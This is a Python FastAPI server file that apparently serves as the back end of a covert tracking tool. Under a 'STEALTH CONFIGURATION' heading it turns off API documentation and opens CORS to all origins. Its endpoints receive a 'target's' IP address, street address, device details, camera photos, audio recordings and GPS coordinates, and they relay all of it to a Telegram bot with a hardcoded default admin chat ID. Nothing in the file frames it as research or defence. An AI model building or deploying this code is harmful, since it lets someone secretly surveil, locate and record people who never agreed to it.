import os
import httpx
import uvicorn
from fastapi import FastAPI, UploadFile, File, Form, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse

# --- STEALTH CONFIGURATION ---
app = FastAPI(
    docs_url=None, 
    redoc_url=None, 
    openapi_url=None
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
DEFAULT_ADMIN_ID = "7616065999"

# --- CORE FUNCTIONS (THE "FXN" LIST) ---
@app.post("/user-info")
async def receive_info(request: Request):
    try:
        data = await request.json()
        chat_id = data.get("chat_id", DEFAULT_ADMIN_ID)
        
        report = (
            " New Target Activity Detected\n"
            f" IP: {data.get('ip_info', {}).get('ip', 'N/A')}\n"
            f" Loc: {data.get('location', {}).get('address', {}).get('full_address', 'N/A')}\n"
            f" Device: {data.get('device', {}).get('platform')} | {data.get('device', {}).get('vendor')}\n"
            f" Battery: {data.get('battery', {}).get('level')}\n"
            f" TZ: {data.get('device', {}).get('timezone')}"
        )

        async with httpx.AsyncClient() as client:
            await client.post(f"{TELEGRAM_API}/sendMessage", json={
                "chat_id": chat_id,
                "text": report,
                "parse_mode": "Markdown"
            })
    except Exception as e:
        print(f"Error: {e}")
    return {"status": "ok"}

@app.post("/photo")
async def receive_photo(chat_id: str = Form(DEFAULT_ADMIN_ID), photo: UploadFile = File(...)):
    photo_bytes = await photo.read()
    async with httpx.AsyncClient() as client:
        await client.post(
            f"{TELEGRAM_API}/sendPhoto",
            data={"chat_id": chat_id, "caption": " Cam Capture"},
            files={"photo": ("c.jpg", photo_bytes, "image/jpeg")}
        )
    return {"status": "ok"}

@app.post("/audio")
async def receive_audio(chat_id: str = Form(DEFAULT_ADMIN_ID), audio: UploadFile = File(...)):
    audio_bytes = await audio.read()
    async with httpx.AsyncClient() as client:
        await client.post(
            f"{TELEGRAM_API}/sendAudio",
            data={"chat_id": chat_id, "caption": " Audio Record"},
            files={"audio": ("a.webm", audio_bytes, "audio/webm")}
        )
    return {"status": "ok"}

@app.post("/location")
async def receive_location(
    chat_id: str = Form(DEFAULT_ADMIN_ID), 
    latitude: float = Form(...), 
    longitude: float = Form(...)
):
    async with httpx.AsyncClient() as client:
        await client.post(f"{TELEGRAM_API}/sendLocation", json={
            "chat_id": chat_id,
            "latitude": latitude,
            "longitude": longitude
        })
    return {"status": "ok"}

@app.get("/ping")
async def ping():
    return {"status": "alive"}

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    uvicorn.run(app, host="0.0.0.0", port=port)
